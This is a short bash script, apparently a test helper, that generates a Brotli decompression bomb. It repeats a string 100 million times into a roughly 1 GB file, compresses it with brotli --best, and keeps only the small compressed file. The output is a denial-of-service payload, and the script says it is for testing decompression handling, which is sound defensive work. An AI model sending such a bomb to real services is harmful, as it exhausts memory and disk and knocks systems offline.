#!/bin/bash

# Script to create a Brotli decompression bomb for testing
# Warning: The uncompressed file is 1 GB large!

# Configurable parameters
OUTPUT_FILE="brotli-decompression-bomb.txt"
COMPRESSED_FILE="${OUTPUT_FILE}.br"
REPEAT_STRING="HAHAHAHAHA"
REPEAT_COUNT=100000000 # Number of times the string is repeated

# Delete the OUTPUT_FILE and COMPRESSED_FILE if they exist
[ -f "$OUTPUT_FILE" ] && rm "$OUTPUT_FILE"
[ -f "$COMPRESSED_FILE" ] && rm "$COMPRESSED_FILE"

# Create a single long line of repetitive data
printf "%0.s$REPEAT_STRING" $(seq 1 $REPEAT_COUNT) > "$OUTPUT_FILE"

# Compress the file using Brotli
brotli --best "$OUTPUT_FILE"

# Remove the uncompressed file
rm "$OUTPUT_FILE"

echo "Created and compressed bomb file: $COMPRESSED_FILE"
